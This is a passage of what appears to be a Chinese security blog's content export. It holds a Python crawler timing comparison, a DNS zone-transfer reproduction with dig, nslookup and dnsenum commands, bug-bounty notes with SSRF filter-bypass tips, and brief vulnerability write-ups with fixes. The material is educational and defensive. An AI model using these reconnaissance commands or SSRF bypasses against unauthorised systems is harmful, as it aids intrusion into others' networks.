  \turl = 'https://www.teamssix.com'\n    \thtml = req_url(url)\n    \thome_page = soup_url(html)\n    \tfor i in home_page:\n    \t\treq_url(i)\n    \tend_time = time.time()\n    \tprint('\\n单线程：',end_time - start_time)\n```\n最终运行结果如下：\n```\n    单线程： 29.181440114974976\n```\n单线程花费了 29 秒的时间，接下来使用多进程测试一下\n\n# 0x04 测试多进程爬取方法\n\n通过学习发现多进程的用法和多线程还是挺相似的，所以就直接放代码吧，感兴趣的可以看看参考文章。\n```Python\n    if __name__ == '__main__':\n    \t# 开始多进程\n    \tstart_time = time.time()\n    \turl = 'https://www.teamssix.com'\n    \tpool = Pool(4)\n    \thome_page = soup_url(req_url(url))\n    \tfor i in home_page:\n    \t\tpool.apply_async(req_url, args=(i,))\n    \tpool.close()\n    \tpool.join()\n    \tend_time = time.time()\n    \tprint('\\n多进程：',end_time - start_time)\n```\n最终运行结果如下：\n```\n    多进程： 12.674117088317871\n```\n多进程仅用了 12 秒就完成了任务，经过多次测试，发现使用多进程基本上能比单线程快2倍以上。\n\n为了看到多线程与多进程的差距，这里使用多线程处理了一下上面的操作，代码如下：\n```Python\n    if __name__ == '__main__':\n    \t#开始多线程\n    \tstart_time = time.time()\n    \turl = 'https://www.teamssix.com'\n    \tthread_list = []\n    \thome_page = soup_url(req_url(url))\n    \tfor i in home_page:\n    \t\tt = threading.Thread(target = req_url, args=(i,))\n    \t\tthread_list.append(t)\n    \tfor i in thread_list:\n    \t\ti.start()\n    \tfor i in thread_list:\n    \t\ti.join()\n    \tend_time = time.time()\n    \tprint('\\n多线程：', end_time - start_time)\n```\n最终运行结果如下：\n```\n    多线程： 11.685778141021729\n```\n看到这里可能会觉着，这多线程和多进程爬虫的时间也差不多呀，然而事实并非那么简单。\n\n由于爬虫的大多数时间都耗在了请求等待响应中，所以在爬虫的时候使用多线程好像快了不少，但我以前写过一个笔记：[不一定有效率GIL](https://www.teamssix.com/year/191104-101112.html)\n在这篇文章里演示了如果使用单线程和多线程处理密集计算任务，有时多线程反而会比单线程慢了不少，所以接下来就看看多进程处理密集计算任务的表现。\n\n# 0x05 处理密集计算任务耗时对比\n\n直接上代码：\n```Python\n    import time  # 测试爬取时间\n    import threading\n    from multiprocessing import Pool\n    \n    def math(i):\n    \tresult2 = 2 ** i    #执行幂运算\n    \n    \n    if __name__ == '__main__':\n    \t#开始单线程\n    \tstart_time = time.time()\n    \tfor i in range(0, 1000000001, 250000000):\n    \t\tmath(i)\n    \tend_time = time.time()\n    \tprint('\\n单线程：',end_time - start_time)\n    \n    \t#开始多进程\n    \tstart_time = time.time()\n    \tpool = Pool(4)\n    \tfor i in range(0, 1000000001, 250000000):\n    \t\tpool.apply_async(math, args=(i,))\n    \tpool.close()\n    \tpool.join()\n    \tend_time = time.time()\n    \tprint('\\n多进程：',end_time - start_time)\n    \n    \t# 开始多线程\n    \tstart_time = time.time()\n    \tthread_list = []\n    \tfor i in range(0, 1000000001, 250000000):\n    \t\tt = threading.Thread(target = math, args=(i,))\n    \t\tthread_list.append(t)\n    \tfor i in thread_list:\n    \t\ti.start()\n    \tfor i in thread_list:\n    \t\ti.join()\n    \tend_time = time.time()\n    \tprint('\\n多线程：', end_time - start_time)\n```\n最终运行结果如下：\n```\n    单线程： 20.495169162750244\n    \n    多进程： 11.645867347717285\n    \n    多线程： 22.07299304008484\n```\n通过运行结果可以很明显看出，单线程与多线程的耗时差距不大，但是多进程的耗时与之相比几乎快了一倍，所以平时为了提高效率是使用多线程还是多进程，也就很清楚了。\n\n但如果平时想提高爬虫效率是用多线程还是多进程呢？毕竟他们效率都差不多，那么协程了解一下🧐\n\n> 更多信息欢迎关注我的个人微信公众号：TeamsSix\n> 参考文章：\n> https://morvanzhou.github.io/tutorials/data-manipulation/scraping/4-01-distributed-scraping/\n> https://www.liaoxuefeng.com/wiki/1016959663602400/1017628290184064","tags":["Python","多进程","分布式"],"categories":["Python 其他相关笔记"]},{"title":"【漏洞复现】DNS域传送漏洞","url":"/year/191206-172901.html","content":"注：本文中使用的域名是不存在DNS域传送漏洞的，本文仅用作技术交流学习用途，严禁将该文内容用于违法行为。\n<!--more-->\n# 0x00 漏洞描述\nDNS: 网域名称系统（英文：Domain Name System，缩写：DNS）是互联网的一项服务。\n\n它作为将域名和IP地址相互映射的一个分布式数据库，能够使人更方便地访问互联网。\n\nDNS使用TCP和UDP端口53，当前，对于每一级域名长度的限制是63个字符，域名总长度则不能超过253个字符。\n\n常用的DNS记录有以下几类：\n\n```\n主机记录(A记录)：\nA记录是用于名称解析的重要记录，它将特定的主机名映射到对应主机的IP地址上。\n\nIPv6主机记录(AAAA记录)：\n与A记录对应，用于将特定的主机名映射到一个主机的IPv6地址。 \n\n别名(CNAME记录)：\nCNAME记录用于将某个别名指向到某个A记录上，这样就不需要再为某个新名字另外创建一条新的A记录。\n\n电子邮件交换记录（MX记录)：\n记录一个邮件域名对应的IP地址\n\n域名服务器记录 (NS记录)：\n记录该域名由哪台域名服务器解析\n\n反向记录(PTR记录):\n也即从IP地址到域名的一条记录\n\nTXT记录：\n记录域名的相关文本信息\n```\nDNS服务器分为主服务器，备份服务器，缓存服务器。\n\n备份服务器需要利用“域传送”从主服务器上复制数据，然后更新自身的数据库，以达到数据同步的目的，这样是为了增加冗余，万一主服务器挂了还有备份服务器顶着。\n\n而“域传送”漏洞则是由于dns配置不当，本来只有备份服务器能获得主服务器的数据，由于漏洞导致任意client都能通过“域传送”获得主服务器的数据（zone数据库信息）。\n\n这样，攻击者就能获得某个域的所有记录，甚至整个网络拓扑都暴露无遗，凭借这份网络蓝图，攻击者可以节省很多扫描时间以及信息收集的时间，还提升了准确度等等。\n\n大的互联网厂商通常将内部网络与外部互联网隔离开，一个重要的手段是使用 Private DNS。如果内部 DNS 泄露，将造成极大的安全风险。风险控制不当甚至造成整个内部网络沦陷。\n\n# 0x01 漏洞利用\n## 1、Windows下使用nslookup\nnslookup命令以两种方式运行：非交互式和交互式。\n\n1、非交互式模式下，查看对应主机域的域名服务器\n\n```\n~# nslookup -type=ns teamssix.com\n\n服务器:  ns-gg.online.ny.cn\nAddress:  118.192.13.5\n非权威应答:\nteamssix.com    nameserver = clint.ns.cloudflare.com\nteamssix.com    nameserver = isla.ns.cloudflare.com\n```\n2、进入交互模式，指定域名服务器，列出域名信息\n```\n~# nslookup\n\n默认服务器:  ns-gg.online.ny.cn\nAddress:  118.192.13.5\n\n> server clint.ns.cloudflare.com\n\n默认服务器:  clint.ns.cloudflare.com\nAddresses:  2400:cb00:2049:1::adf5:3b5a\n          2606:4700:58::adf5:3b5a\n          173.245.59.90\n\n> ls teamssix.com\n\nls: connect: No such file or directory\n*** 无法列出域 teamssix.com: Unspecified error\nDNS 服务器拒绝将区域 teamssix.com 传送到你的计算机。如果这不正确，\n请检查 IP 地址 2400:cb00:2049:1::adf5:3b5a 的 DNS 服务器上 teamssix.com 的\n区域传送安全设置。\n```\n如果提示无法列出域，那就说明此域名不存在域传送漏洞。\n## 2、Kali下使用dig、dnsenum、dnswalk\n### a、dig\n这里涉及dig 一个重要的命令axfr，axfr 是q-type类型的一种，axfr类型是Authoritative Transfer的缩写，指请求传送某个区域的全部记录。\n\n我们只要欺骗dns服务器发送一个axfr请求过去，如果该dns服务器上存在该漏洞，就会返回所有的解析记录值。\n\ndig的整体利用步骤基本和nslookup一致。\n\n1、查看对应主机域的域名服务器\n\n```\n~# dig teamssix.com ns\n\n; <<>> DiG 9.11.5-P4-5.1-Debian <<>> teamssix.com ns\n;; global options: +cmd\n;; Got answer:\n;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 16945\n;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 0\n\n;; QUESTION SECTION:\n;teamssix.com.                  IN      NS\n\n\n;; ANSWER SECTION:\nteamssix.com.           5       IN      NS      clint.ns.cloudflare.com.\nteamssix.com.           5       IN      NS      isla.ns.cloudflare.com.\n\n\n;; Query time: 6 msec\n;; SERVER: 10.18.37.7#54(10.18.37.7)\n;; WHEN: Fri Dec 06 03:30:37 EST 2019\n;; MSG SIZE  rcvd: 83\n```\n2、向该域名发送axfr 请求\n\n```\n~# dig axfr @clint.ns.cloudflare.com teamssix.com\n\n; <<>> DiG 9.11.5-P4-5.1-Debian <<>> axfr @clint.ns.cloudflare.com teamssix.com\n; (3 servers found)\n;; global options: +cmd\n; Transfer failed.\n```\n\n### b、dnsenum\n这个工具相较于之前的方法要为简单，一行命令即可\n\n```\n~# dnsenum -enum teamssix.com\n\nSmartmatch is experimental at /usr/bin/dnsenum line 698.\nSmartmatch is experimental at /usr/bin/dnsenum line 698.\ndnsenum VERSION:1.2.4\nWarning: can't load Net::Whois::IP module, whois queries disabled.\nWarning: can't load WWW::Mechanize module, Google scraping desabled.\n\n-----   teamssix.com   -----\n\nHost's addresses:\n__________________\nteamssix.com.                            5        IN    A        104.28.22.70\nteamssix.com.                            5        IN    A        104.28.23.70\n\nName Servers:\n______________\n\nisla.ns.cloudflare.com.                  5        IN    A        173.245.58.119\nclint.ns.cloudflare.com.                 5        IN    A        173.245.59.90\nclint.ns.cloudflare.com.                 5        IN    RRSIG             (\n\nMail (MX) Servers:\n___________________\n\nTrying Zone Transfers and getting Bind Versions:\n_________________________________________________\n\nTrying Zone Transfer for teamssix.com on isla.ns.cloudflare.com ...\nAXFR record query failed: FORMERR\n\nTrying Zone Transfer for teamssix.com on clint.ns.cloudflare.com ...\nAXFR record query failed: FORMERR\n\nbrute force file not specified, bay.\n```\n### c、dnswalk\ndnswalk的使用同样一条命令，但是注意在域名最后加上一个点\n\n```\n~# dnswalk teamssix.com.\n\nChecking teamssix.com.\nGetting zone transfer of teamssix.com. from clint.ns.cloudflare.com...failed\nFAIL: Zone transfer of teamssix.com. from clint.ns.cloudflare.com failed: FORMERR\nGetting zone transfer of teamssix.com. from isla.ns.cloudflare.com...failed\nFAIL: Zone transfer of teamssix.com. from isla.ns.cloudflare.com failed: FORMERR\nBAD: All zone transfer attempts of teamssix.com. failed!\n2 failures, 0 warnings, 1 errors.\n```\n# 0x02 修复建议\n区域传送是 DNS 常用的功能，为保证使用安全，应严格限制允许区域传送的主机，例如一个主 DNS 服务器应该只允许它的备用 DNS 服务器执行区域传送功能。\n\n在相应的 zone、options 中添加 allow-transfer，对执行此操作的服务器进行限制。如：\n\n* 严格限制允许进行区域传送的客户端的 IP\n```\nallow-transfer ｛1.1.1.1; 2.2.2.2;｝\n```\n\n* 设置 TSIG key\n```\nallow-transfer ｛key \"dns1-slave1\"; key \"dns1-slave2\";｝\n```\n# 0x03 总结\n最后感谢前辈们的文章与辛勤奉献，DNS域传送漏洞除了本文中讨论的方法外，也可以使用Python脚本或者万能的nmap，这里就不做讨论啦。\n\n想写这篇文章已经想一周了，今天终于有时间给整理整理，另外前文发布的Pigat工具，最近也会修复一些bug提交到Github更新哒。\n\n>更多信息欢迎关注我的个人公众号：TeamsSix\n\n>参考文章：\n>http://sunu11.com/2017/03/16/8/\n>https://www.jianshu.com/p/d2af08e6f8fb\n>http://www.lijiejie.com/dns-zone-transfer-1/\n>https://www.alibabacloud.com/help/zh/faq-detail/37529.htm\n>https://www.lsablog.com/networksec/awd/dns-zone-transfer/\n>https://larry.ngrep.me/2015/09/02/DNS-zone-transfer-studying/","tags":["漏洞复现","DNS","域传送"],"categories":["漏洞复现"]},{"title":"【直播笔记】白帽子的成长之路","url":"/year/191201-220910.html","content":"* 子域名监听工具：https://github.com/guimaizi/get_domain，新出来的子域名往往漏洞较多\n\n* 关于挖掘src漏洞:\n1. 白帽子主要是寻找扫描器和风控系统覆盖不到的地方，比如domxss、越权漏洞和逻辑漏洞\n2. 开发运维人员的一些疏忽的点\n<!--more-->\n3. 还有因为厂商毕竟是赚钱是第一要务，因双十一、游戏活动之类紧急上线的业务并没有被安全部门测试过，这些通常会出现问题。\n4. 漏洞主要还是存在于交互处，也就是需要表单填写多的地方，这种场景大家应该会时常遇到。\n5. 漏洞利用，这是厂商和当前法律明令禁止的....请参考国外博客，和自己私下测试，还有纯刷src角度，我个人觉得别用扫描器扫厂商业务，他们一个payload打过去,封ip封账号不说，爬虫爬过去说不定你就收到一张传票或者被查水表，就进去了……\n\n* 学习路径：[https://mp.weixin.qq.com/s/nE8a4Z-qCXwOrvZXE-gLFg](https://mp.weixin.qq.com/s/nE8a4Z-qCXwOrvZXE-gLFg)\n\n* SSRF无回显的挖掘方法：[https://mp.weixin.qq.com/s/R-N9e0PfrWY2GluLrjLlww](https://mp.weixin.qq.com/s/R-N9e0PfrWY2GluLrjLlww)\n1. 基本上useragent是来自容器的 都很大程度上存在这个漏洞\n2. 这个漏洞最简单的挖掘方法就是先尝试一遍外网 判断是否服务器端发起的，再去找该厂商的内网ip或者内网域名\n3. 找到后需要遍历它内网有什么端口\n4. 如果想把它当作内网一样访问资产，可以利用fiddler配置一下就可以了。\n5. 如果它存在不让请求内网的怎么办？可以买一个域名，将域名A解析到它内网ip再做请求，或者利用302跳转，短链接等方式\n\n* bypass技巧：[https://mp.weixin.qq.com/s/zIOH1nMe-Ekeo4ga2wDRgw](https://mp.weixin.qq.com/s/zIOH1nMe-Ekeo4ga2wDRgw)\n\n* 关于考证\n1. 如果是搞渗透测试方向的话，入门建议OSCP，这是公认的全球最强渗透测试认证资质。考完了也就相当于拥有了渗透测试中级水平，完全可以应对国内大多数渗透测试岗位工作\n2. cisp-pte、cisp-pts这类国测的证，主要是找投标资质用的，实战意义不是太大\n3. cisp可以帮助大家更加全面的认真整个信息安全，从宏观上了解我国对于信息安全的政策和相关知识\n\n* [TPSA19-22]SRC行业安全测试规范：[https://security.tencent.com/index.php/announcement/msg/180](https://security.tencent.com/index.php/announcement/msg/180)\n\n","tags":["直播","笔记","总结","成长之路"],"categories":["笔记总结"]},{"title":"【漏洞笔记】Robots.txt站点文件","url":"/year/191127-201447.html","content":"# 0x00 概述\n漏洞名称：Robots.txt站点文件\n\n风险等级：低\n\n问题类型：服务器设置问题\n\n# 0x01 漏洞描述\nRobots.txt文件中声明了不想被搜索引擎访问的部分或者指定搜索引擎收录指定的部分。\n<!--more-->\n此信息可以帮助攻击者得到网站部分文件名称、目录名称，了解网站结构。\n\n# 0x02 漏洞危害\n攻击者可通过发现robots.txt文件，收集网站的敏感目录或文件，从而有针对性的进行利用。\n\n# 0x03 修复建议\n1、将敏感的文件和目录放在一个排除搜索引擎访问的目录中\n\n2、robots.txt内容可设为Disallow: /，禁止搜索引擎访问网站的任何内容\n\n>更多信息欢迎关注我的个人微信公众号：TeamsSix","tags":["漏洞笔记","Robots.txt","服务器设置问题"],"categories":["漏洞笔记"]},{"title":"【漏洞笔记】Host头攻击","url":"/year/191127-201443.html","content":"# 0x00 概述\n漏洞名称：Host头攻击\n\n风险等级：低\n\n问题类型：管理员设置问题\n\n# 0x01 漏洞描述\nHost首部字段是HTTP/1.1新增的，旨在告诉服务器，客户端请求的主机名和端口号，主要用来实现虚拟主机技术。\n<!--more-->\n运用虚拟主机技术，单个主机可以运行多个站点。\n\n例如：hacker和usagidesign两个站点都运行在同一服务器A上，不管我们请求哪个域名，最终都会被解析成服务器A的IP地址，这个时候服务器就不知道该将请求交给哪个站点处理，因此需要Host字段指定请求的主机名。\n\n我们访问hacker域名，经DNS解析，变成了服务器A的IP，请求传达到服务器A，A接收到请求后，发现请求报文中的Host字段值为hacker，进而将请求交给hacker站点处理。\n\n这个时候，问题就出现了。为了方便获取网站域名，开发人员一般依赖于请求包中的Host首部字段。例如，在php里用_SERVER[\"HTTP_HOST\"]，但是这个Host字段值是不可信赖的(可通过HTTP代理工具篡改)。\n\n# 0x02 漏洞危害\n如果应用程序没有对Host字段值进行处理，就有可能造成恶意代码的传入。\n\n# 0x03 修复建议\n对Host字段进行检测\n\nNginx，修改ngnix.conf文件，在server中指定一个server_name名单，并添加检测。\n\nApache，修改httpd.conf文件，指定ServerName，并开启UseCanonicalName选项。\n\nTomcat，修改server.xml文件，配置Host的name属性。\n\n>更多信息欢迎关注我的个人微信公众号：TeamsSix\n\n>参考文章：\n>[https://www.jianshu.com/p/690acbf9f321](https://www.jianshu.com/p/690acbf9f321)","tags":["漏洞笔记","管理员设置问题","Host头"],"categories":["漏洞笔记"]},{"title":"【经验总结】常见的HTTP方法","url":"/year/191127-201438.html","content":"# 0x00 概述\n根据HTTP标准，HTTP请求可以使用多种请求方法。\n\nHTTP1.0定义了三种请求方法： GET, POST 和 HEAD方法。\n\nHTTP1.1新增了六种请求方法：OPTIONS、PUT、PATCH、DELETE、TRACE 和 CONNECT方法。\n<!--more-->\n# 0x01 GET\nGET方法用于请求指定的页面信息，并返回实体主体。\n\n# 0x02 HEAD\nHEAD方法请求一个与GET请求的响应相同的响应，但没有响应体。\n\n# 0x03 POST\n向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。\n\n数据被包含在请求体中，POST请求可能会导致新的资源建立或已有资源的修改。\n\n# 0x04 PUT\nPUT方法用请求有效载荷替换目标资源的所有当前表示。\n\n# 0x05 DELETE\n请求服务器删除指定的页面。\n\n# 0x06 CONNECT\nHTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。\n\n# 0x07 OPTIONS\n允许客户端查看服务器的性能。\n\n# 0x08 TRACE\n回显服务器收到的请求，主要用于测试或诊断。\n\n# 0x09 PATCH\n是对PUT方法的补充，用来对已知资源进行局部更新。\n\n>更多信息欢迎关注我的个人微信公众号：TeamsSix\n\n>参考文章：\n>[https://www.runoob.com/http/http-methods.html](https://www.runoob.com/http/http-methods.html)\n>[https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods)","tags":["经验总结","HTTP方法"],"categories":["经验总结"]},{"title":"【漏洞笔记】ASP.NET允许文件调试","url":"/year/191126-215809.html","content":"# 0x00 概述\n漏洞名称：ASP.NET允许文件调试\n\n风险等级：低\n\n问题类型：管理员设置问题\n\n# 0x01 漏洞描述\n发送DEBUG动作的请求，如果服务器返回内容为OK，那么服务器就开启了调试功能，可能会导致有关Web应用程序的敏感信息泄露，例如密码、路径等。\n<!--more-->\n# 0x02 漏洞危害\n可能会泄露密码、路径等敏感信息。\n\n# 0x03 修复建议\n编辑Web.config文件，设置```&lt;compilation debug=\"false\"/&gt;```\n\n>更多信息欢迎关注我的个人微信公众号：TeamsSix","tags":["漏洞笔记","ASP.NET","管理员设置问题"],"categories":["漏洞笔记"]},{"title":"【漏洞笔记】IIS短文件名泄露","url":"/year/191126-215804.html","content":"# 0x00 概述\n漏洞名称：IIS短文件名泄露\n\n风险等级：低\n\n问题类型：信息泄露\n\n# 0x01 漏洞描述\n此漏洞实际是由HTTP请求中旧DOS 8.3名称约定（SFN）的代字符（〜）波浪号引起的。\n<!--more-->\n为了兼容16位MS-DOS程序，Windows为文件名较长的文件（和文件夹）生成了对应的windows 8.3 短文件名。\n\nMicrosoft IIS 波浪号造成的信息泄露是世界网络范围内最常见的中等风险漏洞。这个问题至少从1990年开始就已经存在，但是已经证明难以发现，难以解决或容易被完全忽略。\n\n**受影响的版本：**\nIIS 1.0，Windows NT 3.51 \nIIS 3.0，Windows NT 4.0 Service Pack 2 \nIIS 4.0，Windows NT 4.0选项包\nIIS 5.0，Windows 2000 \nIIS 5.1，Windows XP Professional和Windows XP Media Center Edition \nIIS 6.0，Windows Server 2003和Windows XP Professional x64 Edition \nIIS 7.0，Windows Server 2008和Windows Vista \nIIS 7.5，Windows 7（远程启用<customErrors>或没有web.config）\nIIS 7.5，Windows 2008（经典管道模式）\n注意：IIS使用.Net Framework 4时不受影响\n\n**漏洞的局限性：**\n1) 只能猜解前六位，以及扩展名的前3位。\n2) 名称较短的文件是没有相应的短文件名的。\n3）需要IIS和.net两个条件都满足。\n\n# 0x02 漏洞危害\n**主要危害：利用“~”字符猜解暴露短文件/文件夹名**\n\n由于短文件名的长度固定（xxxxxx~xxxx），因此黑客可直接对短文件名进行暴力破解 ，从而访问对应的文件。\n\n举个例子，有一个数据库备份文件 backup_www.abc.com_20150101.sql ，它对应的短文件名是 backup~1.sql 。因此黑客只要暴力破解出backup~1.sql即可下载该文件，而无需破解完整的文件名。\n\n**次要危害：.Net Framework的拒绝服务攻击 **\n\n攻击者如果在文件夹名称中发送一个不合法的.Net文件请求，.NeFramework将递归搜索所有的根目录，消耗网站资源进而导致DOS问题。\n\n# 0x03 修复建议\n1、CMD关闭NTFS 8.3文件格式的支持\n\n2、修改注册表禁用短文件名功能\n\n3、关闭Web服务扩展- ASP.NET\n\n4、升级netFramework至4.0以上版本\n\n>更多信息欢迎关注我的个人微信公众号：TeamsSix\n\n>参考文章：\n>[https://www.freebuf.com/articles/web/172561.html](https://www.freebuf.com/articles/web/172561.html)\n>[https://segmentfault.com/a/1190000006225568](https://segmentfault.com/a/1190000006225568)","tags":["漏洞笔记","IIS","信息泄露"],"categories":["漏洞笔记"]},{"title":"Pigat：一款被动信息收集聚合工具","url":"/year/191126-215759.html","content":"# 0x00 前言\nPigat即Passive Intelligence Gathering Aggregation Tool，翻译过来就是被动信息收集聚合工具，既然叫聚合工具，也就是说该工具将多款被动信息收集工具结合在了一起，进而提高了平时信息收集的效率。\n\n早在一个月前便萌生了开发这个工具的想法，但是一直没有时间，正好最近有时间了，就简单写一下。\n<!--more-->\n因为我没有太多的开发经验，所以这款工具难免存在需要改进的地方，因此希望各位大佬能够多多反馈这款工具存在的问题，一起完善这个工具。\n\n# 0x01 工具原理及功能概述\n这款工具的原理很简单，用户输入目标url，再利用爬虫获取相关被动信息收集网站关于该url的信息，最后回显出来。\n\n目前该工具具备8个功能，原该工具具备7个功能，分别为收集目标的资产信息、CMS信息、DNS信息、备案信息、IP地址、子域名信息、whois信息，现加入第8个功能：如果在程序中两次IP查询目标URL的结果一致，那么查询该IP的端口，即端口查询功能。\n\n# 0x02 工具简单上手使用\n## 1、查看帮助信息\n```\n# python pigat.py -h\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/pigat1.png)\n\n## 2、指定url进行信息获取\n如果只指定url这一个参数，没有指定其他参数，则默认获取该url的所有信息\n```\n# python pigat.py -u teamssix.com\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/pigat2.png)\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/pigat3.png)\n\n## 3、指定url进行单项信息获取\n```\n# python pigat.py -u baidu.com --assert\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/pigat4.png)\n\n## 4、指定url进行多项信息获取\n```\n# python pigat.py -u teamssix.com --ip --cms\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/pigat5.png)\n\n# 0x03 工具获取\n关于此工具的下载地址可在我的个人公众号（TeamsSix）回复\"pigat\"获取。\n\n# 0x04 声明\n1、本文在FreeBuf首发，原文地址在文章尾部\n\n2、由于我的个人疏忽，导致在FreeBuf文中获取工具的方式存在错误的地方，正确的获取方式应是回复\"pigat\"，而不是\"pigta\"，这就导致不少人及时回复了关键词也没有获取到工具地址，在这里表示深刻歉意，现在公众号后台规则已经更新，上述两个关键词均可以获取到工具地址。\n\n>原文地址：[https://www.freebuf.com/sectool/219681.html](https://www.freebuf.com/sectool/219681.html)","tags":["被动信息收集","pigat","聚合工具"],"categories":["工具使用"]},{"title":"【漏洞笔记】测试目录","url":"/year/191125-195302.html","content":"# 0x00 概述\n漏洞名称：测试目录\n\n风险等级：低\n\n问题类型：信息泄露\n\n# 0x01 漏洞描述\nWeb应用程序在开发过程中，程序员为了测试代码功能，在Web目录下新建测试目录，存放测试代码，可能包含敏感信息。\n<!--more-->\n# 0x02 漏洞危害\n攻击者读取测试目录信息，以便进一步攻击目标站点。\n\n# 0x03 修复建议\n删除或者限制访问测试目录。\n\n>更多信息欢迎关注我的个人微信公众号：TeamsSix","tags":["漏洞笔记","信息泄露","测试目录"],"categories":["漏洞笔记"]},{"title":"【漏洞笔记】测试文件","url":"/year/191125-195256.html","content":"# 0x00 概述\n漏洞名称：测试文件\n\n风险等级：低\n\n问题类型：信息泄露\n\n# 0x01 漏洞描述\nWeb应用程序在开发过程中，程序员为了测试代码功能，在Web目录下新建测试目录，存放测试代码，可能包含敏感信息。\n<!--more-->\n# 0x02 漏洞危害\n攻击者读取测试文件信息，可能进一步攻击目标站点。\n\n# 0x03 修复建议\n删除或者限制访问测试文件。\n\n>更多信息欢迎关注我的个人微信公众号：TeamsSix","tags":["漏洞笔记","信息泄露","测试文件"],"categories":["漏洞笔记"]},{"title":"【漏洞笔记】敏感文件","url":"/year/191123-174558.html","content":"# 0x00 概述\n漏洞名称：敏感文件\n\n风险等级：低\n\n问题类型：信息泄露\n\n# 0x01 漏洞描述\n由于网站运维人员疏忽，存放敏感信息的文件被泄露或由于网站运行出错导致敏感信息泄露。\n\nWeb应用程序显露了某些文件名称，此信息可以帮助攻击者对站点进一步的攻击。例如，知道文件名称之后，攻击者便可能获得它的内容，也许还能猜出其它的文件名或目录名，并尝试访问它们。\n<!--more-->\n# 0x02 漏洞危害\n攻击者可直接下载用户的相关信息，包括网站的绝对路径、用户的登录名、密码、真实姓名、身份证号、电话号码、邮箱、QQ号等。\n\n攻击者通过构造特殊URL地址，触发系统web应用程序报错，在回显内容中，获取网站敏感信息。\n\n攻击者利用泄漏的敏感信息，获取网站服务器web路径，为进一步攻击提供帮助。\n\n攻击者可能通过文件名，也许还能猜出其它的文件名或目录名，并尝试访问它们。这些可能包含敏感信息。攻击者通过搜集信息，以便进一步攻击目标站点。\n\n# 0x03 修复建议\n对网站错误信息进行统一返回，模糊化处理；对存放敏感信息的文件进行加密并妥善储存，避免泄漏敏感信息。\n\n修改复杂的文件名称；从站点中除去不需要的文件。\n\n>更多信息欢迎关注我的个人微信公众号：TeamsSix\n\n\n>参考文章：[https://ninjia.gitbook.io/secskill/web/info](https://ninjia.gitbook.io/secskill/web/info)","tags":["漏洞笔记","信息泄露","敏感文件"],"categories":["漏洞笔记"]},{"title":"【漏洞笔记】敏感目录","url":"/year/191123-174550.html","content":"# 0x00 概述\n漏洞名称：敏感目录\n\n风险等级：低\n\n问题类型：信息泄露\n\n# 0x01 漏洞描述\n目标服务器上存在敏感名称的目录。如/admin、/conf、/backup、/db等这些目录中有可能包含了大量的敏感文件和脚本，如服务器的配置信息或管理脚本等。\n\nWeb应用程序显露了某些目录名称，此信息可以帮助攻击者对站点进一步的攻击。\n<!--more-->\n# 0x02 漏洞危害\n如果这些名称敏感的目录中包含了危险的功能或信息，恶意攻击者有可能利用这些脚本或信息直接获取目标服务器的控制权或基于这些信息实施进一步的攻击。\n\n知道目录之后，攻击者便可能获得目录下边的文件名，也许还能猜出其它的文件名或目录名，并尝试访问它们。这些可能包含敏感信息。攻击者通过搜集信息，以便进一步攻击目标站点。\n\n# 0x03 修复建议\n如果这些目录中包含了敏感内容，可以使用非常规的目录名称，如果能删除也可以删除或者正确设置权限，禁止用户访问。\n\n>更多信息欢迎关注我的个人微信公众号：TeamsSix\n\n>参考文章：[https://www.izhangheng.com/china-top10-web-site-vulnerability-ranking-and-solutions](https://www.izhangheng.com/china-top10-web-site-vulnerability-ranking-and-solutions)","tags":["漏洞笔记","信息泄露","敏感目录"],"categories":["漏洞笔记"]},{"title":"【漏洞笔记】基于HTTP连接的登录请求","url":"/year/191121-220054.html","content":"# 0x00 概述\n漏洞名称：基于HTTP连接的登录请求\n\n风险等级：低\n\n问题类型：信息泄露\n\n# 0x01 漏洞描述\n应用程序使用HTTP连接接受客户端的登录请求，如果登录请求数据没有加密处理，有可能被攻击者嗅探到客户提交的请求数据，请求数据中一般包含用户名密码。\n<!--more-->\n# 0x02 漏洞危害\n可能被同一个局域网内的攻击者嗅探到用户输入的登录数据，如账号和密码。\n\n# 0x03 修复建议\n在提交登录请求数据前加密请求数据或使用HTTPS连接发送登录请求数据。\n\n>更多信息欢迎关注我的微信公众号：TeamsSix\n\n>参考文章：[https://blog.csdn.net/CHS007chs/article/details/52524322](https://blog.csdn.net/CHS007chs/article/details/52524322)\n\n\n","tags":["漏洞笔记","信息泄露","HTTP"],"categories":["漏洞笔记"]},{"title":"【漏洞笔记】jQuery跨站脚本","url":"/year/191120-214129.html","content":"# 0x00 概述\n漏洞名称：jQuery跨站脚本\n\n风险等级：低危\n\n问题类型：使用已知漏洞的组件\n\n# 0x01 漏洞描述\n关于jQuery：jQuery是美国程序员John Resig所研发的一套开源、跨浏览器的JavaScript库。该库简化了HTML与JavaScript之间的操作，并具有模块化、插件扩展等特点。\n<!--more-->\n漏洞原理：jQuery中过滤用户输入数据所使用的正则表达式存在缺陷，可能导致 location.hash跨站漏洞\n\n影响版本：\n\njquery-1.7.1~1.8.3\n\njquery-1.6.min.js，jquery-1.6.1.min.js，jquery-1.6.2.min.js\n\njquery-1.2~1.5\n\n# 0x02 漏洞危害\njQuery 1.4.2版本中，远程攻击者可利用该漏洞向页面中注入任意的HTML。\n\njQuery 1.6.3之前版本中，当使用location.hash选择元素时，通过特制的标签，远程攻击者利用该漏洞注入任意web脚本或HTML。\n\njQuery 3.0.0之前版本中，攻击者可利用该漏洞执行客户端代码。\n\n# 0x03 